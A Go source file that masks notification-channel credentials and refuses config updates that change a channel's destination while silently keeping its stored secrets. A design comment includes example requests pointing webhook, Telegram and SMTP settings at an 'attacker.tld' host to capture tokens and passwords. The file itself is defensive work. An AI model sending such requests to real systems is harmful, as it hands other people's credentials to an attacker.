package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of masked values. When the API echoes credentials it
// replaces the real content with a value carrying this prefix, and when the update endpoint
// receives a value with this prefix it reads it as "keep the stored value unchanged".
//
// A prefix is used instead of an empty string or some fixed constant so that a bit of
// identifying information can ride along (see MaskedValue), letting the user tell "which
// bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short, no hint at all
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying part of a
// webhook address is in its tail (e.g. WeCom's key, Feishu's bot id), while the prefix is
// the same for every bot and has no identifying value. The last 6 characters are not enough
// to recover the credential, but enough for whoever configured it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified since the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config - better to
// have the UI show "config unavailable" than to spit back raw content that may contain
// credentials when the channel type cannot be recognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole: judging
		// each sub-key would require every channel to declare another set of "which sub-keys
		// are credentials" rules, with complexity far beyond the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller
// took no position on the credential fields". It is returned instead of silently letting it
// through or silently dropping the credentials; see PrepareConfigUpdate for the reasoning.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position taken
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") changed; re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: provide a new value, or explicitly leave it empty if credentials are no longer needed; " +
		"the stored credentials are only valid for the old destination, and reusing them would hand them to the new one"
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of a
// "destination change".
//
// It replaces the bare MergeConfig on the channel update path, and closes this path that
// was verified to work in practice: the destination (where messages go) and the credentials
// (which identity sends them) are two independent sets of fields, while MergeConfig keeps
// the stored value for every "unmentioned key". So anyone able to PATCH a channel only has
// to **change the address and stay silent about the credentials** to make the server send
// the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and does not rely on redirects (so refusing cross-host
// redirects does not stop it), and it defeats outright the goal of this package's masking
// mechanism - "credentials are never echoed to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must take an
// explicit position on **every** credential key:
//   - give a new value → the new value is used
//   - explicitly pass an empty string → the field no longer needs credentials (clear semantics preserved)
//   - send the masked value back as-is / simply not mention the key → rejected
//
// The third is rejected too because the meaning of a "masked value" is precisely "keep
// using the old credential", and the old credential is only valid for the old destination.
// "Automatically dropping the credentials" is deliberately not done here - for optional
// credential fields (webhook's headers, email's password) that would silently become "auth
// is gone but the API returns 200", which is harder to troubleshoot than an error. Better
// to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers is an object) has the mask
	// literal embedded in it, the caller put the "keep the stored value" sentinel inside
	// the structure. MergeConfig only treats "a string with the prefix" as masked, so this
	// shape would be stored as an ordinary object as-is - the literal "__masked__" really
	// lands in the database, and later auth fails silently with no error at all. Better to
	// reject it.
	//
	// This check must come **first**: when the address is unchanged there is an early
	// return, and placing it later would only cover the "address changed" path (the first
	// version got exactly this wrong, and the tests caught it right away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were really changed. A masked value equals "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do the ordinary merge (masked values keep the stored value, empty strings clear, the rest overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers refuses submissions that embed the mask sentinel inside a non-string structure.
//
// The masking mechanism presupposes that "the whole value is a string". An object field
// like webhook's headers can only be masked as a whole (written as the string "__masked__")
// or submitted as a whole; putting the sentinel inside the object can neither express
// "keep unchanged" nor avoid being stored in the database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left empty as a whole to keep the stored value, or submitted as a whole with a new value; a mask placeholder cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing via JSON
// serialization also takes care of type differences - the port submitted by the frontend is
// a number, while the one read back from the database is a float64, and a direct == would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "key absent" are the
// same state in this config model, because MergeConfig treats an empty string as an explicit
// clear and deletes the key outright. Without normalization, an optional destination field
// that is always left empty (Telegram's base_url is the only such field: empty means the
// official address) would go down this path -
//
//	base_url:"" is stored on creation  →  the first save has the key deleted by MergeConfig
//	→ on the second save incoming is "" and stored lacks the key, judged as "address changed"
//	→ the credential is a masked value → 400 "destination changed; re-enter the credential fields"
//
// After that every save fails unless the user pastes the Bot Token again, although they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank".
// The rule must agree with MergeConfig's clear check (strings.TrimSpace(s) == ""),
// otherwise a gap opens where "MergeConfig thinks it should be deleted while sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - a key whose incoming value is masked → keep the stored value (the user did not change this field)
//   - a key whose incoming value is an empty string → treated as an explicit clear; the key is deleted
//   - any other key → overwritten with the incoming value
//   - a key present in stored but absent from incoming → kept (partial-update semantics)
//
// Whether an empty string counts as a "clear" needs to be explicit: the frontend form
// submits unfilled fields as empty strings, and writing that as a valid value would really
// wipe a field that was "left empty to keep the stored value". Explicit clearing is chosen
// here because when a wrongly set field must be cleared, the user has no other way to
// express it (omitting the field could distinguish "not provided" from "provided empty",
// but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
